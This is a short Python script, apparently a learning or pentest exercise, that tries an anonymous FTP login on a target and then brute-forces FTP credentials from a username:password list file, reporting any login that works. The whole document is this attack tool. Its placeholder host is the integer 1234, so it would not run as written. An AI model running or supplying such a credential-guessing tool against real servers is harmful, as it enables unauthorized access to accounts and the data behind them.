import ftplib
from os import truncate


def anonymousLogin(targetHostname):
    try:
        ftp = ftplib.FTP(targetHostname)
        ftp.login('anonymous', 'anonymous')
        print("\n[*] "+str(targetHostname) +" FTP Anonymous login successful")
        ftp.quit()
        return True
    except Exception :
        print("\n[ - ] "+str(targetHostname)+" FTP anonymous login failed")
        return False
    
def forceLogin(targetHostname, credentialsFile):
    creds = open(credentialsFile, 'r')
    for line in creds.readlines():
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n')
        print("[+] Trying: "+username + " : "+password)
        
        try:
            ftp = ftplib.FTP(targetHostname)
            ftp.login(username, password)
            print("\n[*] "+str(targetHostname)+" FTP login successful...  "+username+":"+password)
            ftp.quit()
            return(username, password)
        except Exception:
            pass
    print("\n[ - ] Unable to bruteforce any FTP login credentials from given list")
    return(None, None)

















# Make host and creds file reference user input
host = 1234
credentialsFile = "creds.txt"
anonymousLogin(host)
forceLogin(host, credentialsFile)
